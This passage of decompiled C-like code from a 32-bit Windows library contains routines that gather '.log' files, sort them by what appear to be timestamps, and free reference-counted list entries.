  if (cVar17 != cVar16) {
    if (!bVar14 && !bVar15) {
      *(char *)(unaff_EBX + 0x4d8b04c4) = *(char *)(unaff_EBX + 0x4d8b04c4) + (char)uVar3;
    }
    do {
                    /* WARNING: Do nothing block with infinite loop */
    } while( true );
  }
  *unaff_EDI = *unaff_EDI + -1;
  *(char *)(unaff_ESI + -0x7d) = *(char *)(unaff_ESI + -0x7d) + (char)((ushort)uVar3 >> 8);
  _DAT_fffffdd0 = CONCAT13(DAT_fffffdd3 + extraout_DH,_DAT_fffffdd0);
  piVar6 = (int *)FUN_1000ba60(puVar19,uVar4);
  _DAT_fffffb64 = (int *)FUN_1000bd10();
  _DAT_fffffb68 = 3;
  cVar16 = FUN_1004b4e0();
  piVar7 = _DAT_fffffb64;
  piVar8 = _DAT_fffffb64;
  if (cVar16 == '\0') {
    if (_DAT_fffffb98 == 0) {
      piVar7 = (int *)FUN_1000ba60(puVar19,uVar4);
    }
    else {
      piVar7 = (int *)FUN_1000bd10();
    }
    piVar8 = (int *)FUN_1000bd10();
    _DAT_fffffb68 = 0xf;
    cVar16 = FUN_1004b4e0();
    if (cVar16 == '\0') {
      _DAT_fffffb60 = (int *)CONCAT13(1,_DAT_fffffb60);
      goto LAB_100204eb;
    }
  }
  _DAT_fffffb60 = (int *)((uint)_DAT_fffffb60 & 0xffffff);
LAB_100204eb:
  uVar13 = _DAT_fffffb68;
  if (((_DAT_fffffb68 & 8) != 0) &&
     (uVar13 = _DAT_fffffb68 & 0xfffffff7, _DAT_fffffb68 = uVar13, piVar8 != (int *)0x0)) {
    LOCK();
    iVar5 = *piVar8;
    *piVar8 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar8);
      uVar13 = _DAT_fffffb68;
    }
  }
  if (((uVar13 & 4) != 0) &&
     (uVar13 = uVar13 & 0xfffffffb, _DAT_fffffb68 = uVar13, piVar7 != (int *)0x0)) {
    LOCK();
    iVar5 = *piVar7;
    *piVar7 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar7);
      uVar13 = _DAT_fffffb68;
    }
  }
  piVar7 = _DAT_fffffb64;
  if (((uVar13 & 2) != 0) &&
     (uVar13 = uVar13 & 0xfffffffd, _DAT_fffffb68 = uVar13, _DAT_fffffb64 != (int *)0x0)) {
    LOCK();
    iVar5 = *_DAT_fffffb64;
    *_DAT_fffffb64 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar7);
      uVar13 = _DAT_fffffb68;
    }
  }
  if (((uVar13 & 1) != 0) && (_DAT_fffffb68 = uVar13 & 0xfffffffe, piVar6 != (int *)0x0)) {
    LOCK();
    iVar5 = *piVar6;
    *piVar6 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  if (DAT_fffffb63 == '\0') goto LAB_10020631;
  piVar7 = (int *)*_DAT_fffffdd8;
  if (piVar7 != (int *)0x0) {
    LOCK();
    *piVar7 = *piVar7 + 1;
    UNLOCK();
  }
  _DAT_fffffdc8 = 0;
  piVar8 = (int *)FUN_1000bfa0(0xfffffb98,0xffffffff);
  piVar7 = _DAT_fffffb54;
  iVar5 = *_DAT_fffffb54;
  _DAT_fffffb64 = piVar8;
  uVar9 = FUN_10011570(iVar5,*(undefined4 *)(iVar5 + 4),0xfffffb64);
  uVar18 = CONCAT44(uVar9,piVar7[1]);
  if (piVar7[1] != 0x15555554) goto LAB_10020608;
LAB_100205fe:
  uVar18 = FUN_10056a6a("list<T> too long");
LAB_10020608:
  iVar11 = (int)((ulonglong)uVar18 >> 0x20);
  piVar7[1] = (int)uVar18 + 1;
  *(int *)(iVar5 + 4) = iVar11;
  _DAT_fffffdc8 = 0xffffffff;
  **(int **)(iVar11 + 4) = iVar11;
  if (piVar8 != (int *)0x0) {
    LOCK();
    iVar5 = *piVar8;
    *piVar8 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piVar8);
    }
  }
LAB_10020631:
  iVar5 = FUN_10250a71(_DAT_fffffb5c,0xfffffb6c);
  if (iVar5 == 0) {
LAB_100208e2:
    FUN_102ca3c7(_DAT_fffffb5c);
    ExceptionList = _DAT_fffffdc0;
    FUN_100579df();
    return;
  }
  _DAT_fffffb58 = _DAT_fffffb64;
  piVar7 = _DAT_fffffb64;
  do {
    if (_DAT_fffffb98 == 0) {
      if ((DAT_1009acdc & 1) == 0) {
        DAT_1009acdc = DAT_1009acdc | 1;
        _DAT_fffffb64 = (int *)0x0;
        DAT_1009acd8 = (int *)FUN_1000bd10();
        if (DAT_1009acd8 != (int *)0x0) {
          DAT_1009acd8[2] = 0;
          *(undefined2 *)(DAT_1009acd8 + 3) = 0;
        }
        FUN_10057b51(&LAB_10078350);
      }
      piVar8 = DAT_1009acd8;
      if (DAT_1009acd8 != (int *)0x0) {
        LOCK();
        *DAT_1009acd8 = *DAT_1009acd8 + 1;
        UNLOCK();
        piVar8 = DAT_1009acd8;
      }
    }
    else {
      piVar8 = (int *)FUN_1000bd10();
    }
    _DAT_fffffb68 = _DAT_fffffb68 | 0x10;
    piVar6 = (int *)FUN_1000bd10();
    _DAT_fffffb68 = _DAT_fffffb68 | 0x20;
    if ((piVar8 == (int *)0x0) || (ppuVar10 = (undefined **)(piVar8 + 3), piVar8[2] == 0)) {
      ppuVar10 = &PTR_10083554;
    }
    if ((piVar6 == (int *)0x0) || (puVar12 = (ushort *)(piVar6 + 3), puVar12 == (ushort *)0x0)) {
      if ((ppuVar10 != (undefined **)0x0) && (*(ushort *)ppuVar10 != 0)) goto LAB_1002091e;
LAB_10020776:
      _DAT_fffffb60 = (int *)((uint)_DAT_fffffb60 & 0xffffff);
    }
    else {
      if (ppuVar10 == (undefined **)0x0) {
        bVar15 = *puVar12 == 0;
      }
      else {
        do {
          uVar1 = *puVar12;
          bVar15 = uVar1 < *(ushort *)ppuVar10;
          if (uVar1 != *(ushort *)ppuVar10) {
LAB_10020758:
            bVar15 = (-(uint)bVar15 | 1) == 0;
            goto LAB_10020765;
          }
          if (uVar1 == 0) break;
          uVar1 = puVar12[1];
          bVar15 = uVar1 < *(ushort *)((int)ppuVar10 + 2);
          if (uVar1 != *(ushort *)((int)ppuVar10 + 2)) goto LAB_10020758;
          puVar12 = puVar12 + 2;
          ppuVar10 = ppuVar10 + 1;
        } while (uVar1 != 0);
        bVar15 = true;
      }
LAB_10020765:
      if (bVar15) goto LAB_10020776;
LAB_1002091e:
      if (_DAT_fffffb98 == 0) {
        piVar7 = (int *)FUN_1000ba60();
      }
      else {
        piVar7 = (int *)FUN_1000bd10();
      }
      _DAT_fffffb68 = _DAT_fffffb68 | 0x40;
      _DAT_fffffb58 = (int *)FUN_1000bd10();
      _DAT_fffffb68 = _DAT_fffffb68 | 0x80;
      if ((piVar7 == (int *)0x0) || (ppuVar10 = (undefined **)(piVar7 + 3), piVar7[2] == 0)) {
        ppuVar10 = &PTR_10083554;
      }
      if ((_DAT_fffffb58 == (int *)0x0) ||
         (puVar12 = (ushort *)(_DAT_fffffb58 + 3), puVar12 == (ushort *)0x0)) {
        if ((ppuVar10 == (undefined **)0x0) || (*(ushort *)ppuVar10 == 0)) goto LAB_10020776;
        _DAT_fffffb60 = (int *)CONCAT13(1,_DAT_fffffb60);
      }
      else {
        if (ppuVar10 == (undefined **)0x0) {
          bVar15 = *puVar12 == 0;
        }
        else {
          do {
            bVar15 = *puVar12 < *(ushort *)ppuVar10;
            if (*puVar12 != *(ushort *)ppuVar10) {
LAB_100209d1:
              bVar15 = (-(uint)bVar15 | 1) == 0;
              goto LAB_100209de;
            }
            if (*puVar12 == 0) break;
            uVar1 = puVar12[1];
            bVar15 = uVar1 < *(ushort *)((int)ppuVar10 + 2);
            _DAT_fffffb60 = (int *)CONCAT22(uVar1,_DAT_fffffb60);
            if (uVar1 != *(ushort *)((int)ppuVar10 + 2)) goto LAB_100209d1;
            puVar12 = puVar12 + 2;
            ppuVar10 = ppuVar10 + 1;
          } while (uVar1 != 0);
          bVar15 = true;
        }
LAB_100209de:
        if (bVar15) goto LAB_10020776;
        _DAT_fffffb60 = (int *)CONCAT13(1,_DAT_fffffb60);
      }
    }
    piVar2 = _DAT_fffffb58;
    uVar13 = _DAT_fffffb68;
    if (((char)_DAT_fffffb68 < '\0') &&
       (uVar13 = _DAT_fffffb68 & 0xffffff7f, _DAT_fffffb68 = uVar13, _DAT_fffffb58 != (int *)0x0)) {
      LOCK();
      iVar5 = *_DAT_fffffb58;
      *_DAT_fffffb58 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piVar2);
        uVar13 = _DAT_fffffb68;
      }
    }
    if (((uVar13 & 0x40) != 0) &&
       (uVar13 = uVar13 & 0xffffffbf, _DAT_fffffb68 = uVar13, piVar7 != (int *)0x0)) {
      LOCK();
      iVar5 = *piVar7;
      *piVar7 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piVar7);
        uVar13 = _DAT_fffffb68;
      }
    }
    if (((uVar13 & 0x20) != 0) &&
       (uVar13 = uVar13 & 0xffffffdf, _DAT_fffffb68 = uVar13, piVar6 != (int *)0x0)) {
      LOCK();
      iVar5 = *piVar6;
      *piVar6 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piVar6);
        uVar13 = _DAT_fffffb68;
      }
    }
    if (((uVar13 & 0x10) != 0) && (_DAT_fffffb68 = uVar13 & 0xffffffef, piVar8 != (int *)0x0)) {
      LOCK();
      iVar5 = *piVar8;
      *piVar8 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piVar8);
      }
    }
    if (DAT_fffffb63 != '\0') {
      piVar8 = (int *)*_DAT_fffffdd8;
      if (piVar8 != (int *)0x0) {
        LOCK();
        *piVar8 = *piVar8 + 1;
        UNLOCK();
      }
      _DAT_fffffdc8 = 1;
      piVar8 = (int *)FUN_1000bfa0(0xfffffb98,0xffffffff);
      iVar5 = *_DAT_fffffb54;
      _DAT_fffffb60 = piVar8;
      iVar11 = FUN_10011570(iVar5,*(undefined4 *)(iVar5 + 4),0xfffffb60);
      if (_DAT_fffffb54[1] == 0x15555554) goto LAB_100205fe;
      _DAT_fffffb54[1] = _DAT_fffffb54[1] + 1;
      *(int *)(iVar5 + 4) = iVar11;
      _DAT_fffffdc8 = 0xffffffff;
      **(int **)(iVar11 + 4) = iVar11;
      if (piVar8 != (int *)0x0) {
        LOCK();
        iVar5 = *piVar8;
        *piVar8 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar8);
        }
      }
    }
    piVar7 = (int *)&DAT_fffffb6c;
    iVar5 = func_0x1037abe1(_DAT_fffffb5c);
    if (iVar5 == 0) goto LAB_100208e2;
  } while( true );
}



/* Function: FUN_10020a20 */

void __fastcall FUN_10020a20(int *param_1)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  int *piVar6;
  int local_38;
  int *local_34;
  int *local_30;
  int *local_2c;
  int *local_28;
  int *local_24;
  int *local_20;
  int *local_1c;
  int *local_18;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075798;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  piVar5 = *(int **)*param_1;
  local_38 = (int)piVar5;
  local_34 = param_1;
  if (piVar5 != (int *)*param_1) {
    do {
      piVar2 = (int *)FUN_1000ae10(&local_1c);
      if (*piVar2 == 0) {
        iVar3 = 0;
      }
      else {
        iVar3 = *piVar2 + 0xc;
      }
      FUN_1005a7be(iVar3);
      if (local_1c != (int *)0x0) {
        LOCK();
        iVar3 = *local_1c;
        *local_1c = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_1c);
        }
      }
      local_18 = (int *)piVar5[2];
      if (local_18 != (int *)0x0) {
        LOCK();
        *local_18 = *local_18 + 1;
        UNLOCK();
      }
      local_8 = 0;
      FUN_10020e80(&DAT_10084cb8);
      FUN_10019e10(&local_24);
      local_8 = CONCAT31(local_8._1_3_,1);
      piVar2 = (int *)FUN_1000ae10(&local_20);
      if (*piVar2 == 0) {
        iVar3 = 0;
      }
      else {
        iVar3 = *piVar2 + 0xc;
      }
      FUN_1005a7be(iVar3);
      if (local_20 != (int *)0x0) {
        LOCK();
        iVar3 = *local_20;
        *local_20 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_20);
        }
      }
      if (local_24 != (int *)0x0) {
        LOCK();
        iVar3 = *local_24;
        *local_24 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_24);
        }
      }
      FUN_10020e80(&DAT_10084cc0);
      FUN_10019e10(&local_2c);
      local_8 = CONCAT31(local_8._1_3_,2);
      piVar2 = (int *)FUN_1000ae10(&local_28);
      if (*piVar2 == 0) {
        iVar3 = 0;
      }
      else {
        iVar3 = *piVar2 + 0xc;
      }
      FUN_1005a7be(iVar3);
      if (local_28 != (int *)0x0) {
        LOCK();
        iVar3 = *local_28;
        *local_28 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_28);
        }
      }
      local_8 = local_8 & 0xffffff00;
      if (local_2c != (int *)0x0) {
        LOCK();
        iVar3 = *local_2c;
        *local_2c = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(local_2c);
        }
      }
      FUN_10020e80(L".*.log");
      piVar2 = local_18;
      if (local_18 == (int *)0x0) {
        piVar6 = (int *)0x0;
      }
      else {
        piVar6 = local_18 + 3;
      }
      piVar4 = (int *)FUN_1000fa00(0,0);
      local_8._0_1_ = 3;
      FUN_10020000(piVar6,0);
      local_8 = CONCAT31(local_8._1_3_,4);
      for (piVar6 = (int *)*piVar4; piVar6 != piVar4; piVar6 = (int *)*piVar6) {
        piVar2 = (int *)FUN_1000ae10(&local_30);
        if (*piVar2 == 0) {
          iVar3 = 0;
        }
        else {
          iVar3 = *piVar2 + 0xc;
        }
        FUN_1005a7be(iVar3);
        if (local_30 != (int *)0x0) {
          LOCK();
          iVar3 = *local_30;
          *local_30 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(local_30);
          }
        }
        piVar2 = local_18;
      }
      piVar6 = (int *)*piVar4;
      *piVar4 = (int)piVar4;
      piVar4[1] = (int)piVar4;
      while (piVar6 != piVar4) {
        piVar1 = (int *)piVar6[2];
        local_18 = (int *)*piVar6;
        if (piVar1 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar1;
          *piVar1 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar1);
          }
        }
        thunk_FUN_100579ee(piVar6);
        piVar6 = local_18;
      }
      thunk_FUN_100579ee(piVar4);
      local_8 = 0xffffffff;
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar2;
        *piVar2 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      piVar5 = (int *)*piVar5;
    } while (piVar5 != (int *)*local_34);
  }
  FUN_10020e00(&local_38,local_38,*local_34);
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10020cd0 */

void FUN_10020cd0(void)

{
  int iVar1;
  undefined4 uVar2;
  undefined1 auStack_78 [4];
  int *local_74 [9];
  uint local_50;
  int local_4c;
  uint local_20;
  int local_1c;
  uint local_c;
  
  local_c = DAT_100956e0 ^ (uint)auStack_78;
  uVar2 = FUN_1000ae10(local_74);
  FUN_10021330(uVar2);
  if (local_74[0] != (int *)0x0) {
    LOCK();
    iVar1 = *local_74[0];
    *local_74[0] = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_74[0]);
    }
  }
  uVar2 = FUN_1000ae10(local_74);
  FUN_10021330(uVar2);
  if (local_74[0] != (int *)0x0) {
    LOCK();
    iVar1 = *local_74[0];
    *local_74[0] = *local_74[0] + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_74[0]);
    }
  }
  if ((local_1c <= local_4c) && ((local_1c < local_4c || (local_20 < local_50)))) {
    FUN_100579df();
    return;
  }
  FUN_100579df();
  return;
}



/* Function: FUN_10020d90 */

void __fastcall FUN_10020d90(int *param_1)

{
  int iVar1;
  int *piVar2;
  char cVar3;
  int *piVar4;
  int *piVar5;
  
  piVar4 = *(int **)*param_1;
  if (piVar4 != (int *)*param_1) {
    do {
      cVar3 = FUN_10034880(piVar4 + 2);
      if (cVar3 == '\0') {
        piVar5 = (int *)*piVar4;
        *(int **)piVar4[1] = piVar5;
        *(int *)(*piVar4 + 4) = piVar4[1];
        param_1[1] = param_1[1] + -1;
        piVar2 = (int *)piVar4[2];
        if (piVar2 != (int *)0x0) {
          LOCK();
          iVar1 = *piVar2;
          *piVar2 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(piVar2);
          }
        }
        thunk_FUN_100579ee(piVar4);
      }
      else {
        piVar5 = (int *)*piVar4;
      }
      piVar4 = piVar5;
    } while (piVar5 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_10020e00 */

undefined4 * __thiscall
FUN_10020e00(undefined4 *param_1,undefined4 *param_2,int *param_3,int *param_4)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  
  if ((param_3 == *(int **)*param_1) && (param_4 == (int *)*param_1)) {
    FUN_1000ba10();
    *param_2 = *param_1;
    return param_2;
  }
  if (param_3 != param_4) {
    do {
      piVar2 = (int *)*param_3;
      *(int **)param_3[1] = piVar2;
      *(int *)(*param_3 + 4) = param_3[1];
      param_1[1] = param_1[1] + -1;
      piVar3 = (int *)param_3[2];
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar3;
        *piVar3 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      thunk_FUN_100579ee(param_3);
      param_3 = piVar2;
    } while (piVar2 != param_4);
  }
  *param_2 = param_4;
  return param_2;
}



/* Function: FUN_10020e80 */

int __thiscall FUN_10020e80(int *param_1,short *param_2)

{
  short sVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  int **ppiVar5;
  int *local_c;
  int *local_8;
  
  local_8 = (int *)0x5c;
  sVar1 = *param_2;
  local_c = (int *)0x2e;
  iVar2 = FUN_10010c00();
  local_8 = (int *)(iVar2 + 1U);
  iVar3 = FUN_10010c00();
  local_c = (int *)(iVar3 + 1);
  ppiVar5 = &local_c;
  if ((int *)(iVar3 + 1) <= (int *)(iVar2 + 1U)) {
    ppiVar5 = &local_8;
  }
  puVar4 = (undefined4 *)FUN_1000e640(&local_c,0,*ppiVar5);
  iVar2 = FUN_10010440(*puVar4);
  *param_1 = iVar2;
  if (local_c != (int *)0x0) {
    LOCK();
    iVar2 = *local_c;
    *local_c = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(local_c);
    }
  }
  iVar2 = FUN_1000bfa0(param_2 + (sVar1 == 0x2e),0xffffffff);
  *param_1 = iVar2;
  if (iVar2 != 0) {
    return iVar2 + 0xc;
  }
  return 0;
}



/* Function: FUN_10020f30 */

/* WARNING: Type propagation algorithm not settling */

void __fastcall FUN_10020f30(int **param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  code *pcVar6;
  uint uVar7;
  int *piVar8;
  int **ppiVar9;
  int **extraout_ECX;
  int iVar10;
  uint uVar11;
  undefined1 *puVar12;
  uint local_fc;
  uint local_f8;
  int *local_f4;
  int *local_f0 [4];
  undefined1 local_e0 [200];
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100757e1;
  local_10 = ExceptionList;
  uVar7 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_18 = uVar7;
  if ((int *)0x1 < param_1[1]) {
    local_f0[1] = (int *)0x0;
    local_f0[0] = (int *)0x0;
    piVar8 = (int *)FUN_1000fa00(0,0);
    local_8 = 0;
    local_f4 = piVar8;
    FUN_1005849f(local_f0 + 2,8,0x1a,FUN_1000e7c0,FUN_10008e20);
    local_8 = CONCAT31(local_8._1_3_,1);
    local_fc = 0;
    piVar1 = param_1[1];
    piVar4 = (int *)0x0;
    while (piVar1 != (int *)0x0) {
      iVar10 = *piVar8;
      piVar1 = (int *)**param_1;
      iVar2 = *piVar1;
      if (&local_f4 != param_1) {
        if (piVar4 == (int *)0x15555554) {
          FUN_10056a6a("list<T> too long",uVar7);
          pcVar6 = (code *)swi(3);
          (*pcVar6)();
          return;
        }
        local_f0[1] = (int *)((int)piVar4 + 1);
        local_f0[0] = (int *)((int)piVar4 + 1);
        param_1[1] = (int *)((int)param_1[1] + -1);
      }
      *(int *)piVar1[1] = iVar2;
      **(int **)(iVar2 + 4) = iVar10;
      **(int **)(iVar10 + 4) = (int)piVar1;
      iVar3 = *(int *)(iVar10 + 4);
      *(undefined4 *)(iVar10 + 4) = *(undefined4 *)(iVar2 + 4);
      *(int *)(iVar2 + 4) = piVar1[1];
      piVar1[1] = iVar3;
      uVar11 = 0;
      local_f8 = 0;
      if (local_fc == 0) {
LAB_100210f2:
        ppiVar9 = local_f0 + local_f8 * 2 + 2;
        if (ppiVar9 != &local_f4) {
          local_f4 = *ppiVar9;
          *ppiVar9 = piVar8;
          local_f0[0] = *(int **)(local_e0 + local_f8 * 8 + -4);
          *(int **)(local_e0 + local_f8 * 8 + -4) = local_f0[1];
          local_f0[1] = local_f0[0];
          piVar8 = local_f4;
        }
        if (local_f8 == local_fc) {
          local_fc = local_fc + 1;
        }
      }
      else {
        ppiVar9 = local_f0;
        do {
          ppiVar9 = (int **)((int)ppiVar9 + 8);
          if (ppiVar9[1] == (int *)0x0) break;
          FUN_100212a0(&local_f4,local_f0[1]);
          if (ppiVar9 == &local_f4) {
            local_f0[1] = local_f0[0];
          }
          else {
            piVar1 = *ppiVar9;
            *ppiVar9 = local_f4;
            local_f0[1] = ppiVar9[1];
            ppiVar9[1] = local_f0[0];
            local_f0[0] = local_f0[1];
            local_f4 = piVar1;
          }
          uVar11 = uVar11 + 1;
          piVar8 = local_f4;
          local_f0[1] = local_f0[0];
        } while (uVar11 < local_fc);
        local_f8 = uVar11;
        if (uVar11 != 0x19) goto LAB_100210f2;
        FUN_100212a0(&local_f4,local_f0[1]);
        local_f0[1] = local_f0[0];
        piVar8 = local_f4;
      }
      piVar4 = local_f0[1];
      piVar1 = param_1[1];
    }
    if (1 < local_fc) {
      iVar10 = local_fc - 1;
      puVar12 = local_e0;
      ppiVar9 = param_1;
      do {
        FUN_100212a0(puVar12 + -8,ppiVar9);
        puVar12 = puVar12 + 8;
        iVar10 = iVar10 + -1;
        ppiVar9 = extraout_ECX;
      } while (iVar10 != 0);
    }
    ppiVar9 = local_f0 + local_fc * 2;
    if ((param_1 != ppiVar9) && (local_f0[local_fc * 2 + 1] != (int *)0x0)) {
      FUN_10021220(**param_1,ppiVar9,**ppiVar9,*ppiVar9,local_f0[local_fc * 2 + 1]);
    }
    local_8 = local_8 & 0xffffff00;
    _eh_vector_destructor_iterator_(local_f0 + 2,8,0x1a,FUN_10008e20);
    piVar1 = (int *)*piVar8;
    *piVar8 = (int)piVar8;
    piVar8[1] = (int)piVar8;
    while (piVar1 != piVar8) {
      piVar4 = (int *)piVar1[2];
      piVar5 = (int *)*piVar1;
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar10 = *piVar4;
        *piVar4 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      thunk_FUN_100579ee(piVar1);
      piVar1 = piVar5;
    }
    thunk_FUN_100579ee(piVar8);
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10021220 */

void __thiscall
FUN_10021220(int param_1,int param_2,int param_3,int param_4,int param_5,uint param_6)

{
  undefined4 uVar1;
  code *pcVar2;
  
  if (param_1 != param_3) {
    if (0x15555554U - *(int *)(param_1 + 4) < param_6) {
      FUN_10056a6a("list<T> too long");
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    *(uint *)(param_1 + 4) = *(int *)(param_1 + 4) + param_6;
    *(int *)(param_3 + 4) = *(int *)(param_3 + 4) - param_6;
  }
  **(int **)(param_4 + 4) = param_5;
  **(int **)(param_5 + 4) = param_2;
  **(int **)(param_2 + 4) = param_4;
  uVar1 = *(undefined4 *)(param_2 + 4);
  *(undefined4 *)(param_2 + 4) = *(undefined4 *)(param_5 + 4);
  *(undefined4 *)(param_5 + 4) = *(undefined4 *)(param_4 + 4);
  *(undefined4 *)(param_4 + 4) = uVar1;
  return;
}



/* Function: FUN_100212a0 */

void __thiscall FUN_100212a0(int *param_1,int *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  char cVar6;
  
  if (param_2 != param_1) {
    puVar1 = (undefined4 *)*param_1;
    puVar2 = (undefined4 *)*param_2;
    puVar3 = (undefined4 *)*puVar1;
    puVar4 = (undefined4 *)*puVar2;
    puVar5 = puVar4;
    while (puVar3 != puVar1) {
      if (puVar4 == puVar2) {
        return;
      }
      cVar6 = FUN_10020cd0(puVar4 + 2,puVar3 + 2);
      if (cVar6 == '\0') {
        puVar3 = (undefined4 *)*puVar3;
      }
      else {
        puVar4 = (undefined4 *)*puVar4;
        FUN_10021220(puVar3,param_2,puVar5,puVar4,1);
        puVar5 = puVar4;
      }
    }
    if (puVar4 != puVar2) {
      FUN_10021220(puVar1,param_2,puVar4,puVar2,param_2[1]);
    }
  }
  return;
}



/* Function: FUN_10021330 */

undefined4 * __thiscall FUN_10021330(undefined4 *param_1,int *param_2)

{
  int iVar1;
  undefined4 local_38;
  undefined4 uStack_34;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined4 local_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  FUN_1005ff60(&local_38,0,0x30);
  *param_1 = local_38;
  param_1[1] = uStack_34;
  param_1[2] = uStack_30;
  param_1[3] = uStack_2c;
  param_1[4] = local_28;
  param_1[5] = uStack_24;
  param_1[6] = uStack_20;
  param_1[7] = uStack_1c;
  param_1[8] = local_18;
  param_1[9] = uStack_14;
  param_1[10] = uStack_10;
  param_1[0xb] = uStack_c;
  iVar1 = *param_2;
  if ((iVar1 != 0) && (iVar1 != -0xc)) {
    if (iVar1 == 0) {
      iVar1 = 0;
    }
    else {
      iVar1 = iVar1 + 0xc;
    }
    iVar1 = FUN_1005a899(iVar1,param_1);
    if (iVar1 != 0) {
      param_1[10] = 0;
      param_1[0xb] = 0;
      return param_1;
    }
  }
  return param_1;
}



/* Function: FUN_100213b0 */

undefined4 * __fastcall FUN_100213b0(undefined4 *param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 local_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 local_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  int *local_c [2];
  
  FUN_1005ff60(&local_40,0,0x30);
  *param_1 = local_40;
  param_1[1] = uStack_3c;
  param_1[2] = uStack_38;
  param_1[3] = uStack_34;
  param_1[4] = local_30;
  param_1[5] = uStack_2c;
  param_1[6] = uStack_28;
  param_1[7] = uStack_24;
  param_1[8] = local_20;
  param_1[9] = uStack_1c;
  param_1[10] = uStack_18;
  param_1[0xb] = uStack_14;
  piVar1 = (int *)FUN_1000ae10(local_c);
  iVar2 = *piVar1;
  if ((iVar2 != 0) && (iVar2 != -0xc)) {
    if (iVar2 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = iVar2 + 0xc;
    }
    iVar2 = FUN_1005a899(iVar2,param_1);
    if (iVar2 != 0) {
      param_1[10] = 0;
      param_1[0xb] = 0;
    }
  }
  if (local_c[0] != (int *)0x0) {
    LOCK();
    iVar2 = *local_c[0];
    *local_c[0] = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(local_c[0]);
    }
  }
  return param_1;
}



/* Function: FUN_10021450 */

/* WARNING: Type propagation algorithm not settling */

void __fastcall FUN_10021450(undefined4 param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  code *unaff_ESI;
  code *unaff_EDI;
  undefined4 local_1c0;
  int local_1bc;
  undefined4 local_1b8;
  int local_1b4;
  int local_1b0;
  undefined4 local_1ac;
  int local_1a8;
  undefined4 local_1a4;
  undefined4 local_1a0;
  int local_19c [2];
  undefined2 local_194;
  undefined4 local_190;
  undefined2 local_18c;
  int local_188 [4];
  undefined4 local_178;
  undefined4 uStack_174;
  undefined4 uStack_170;
  undefined4 uStack_16c;
  undefined4 local_168;
  undefined4 uStack_164;
  undefined4 uStack_160;
  undefined4 uStack_15c;
  undefined4 local_158;
  undefined4 uStack_154;
  undefined4 uStack_150;
  int iStack_14c;
  int local_c8 [4];
  undefined4 local_b8;
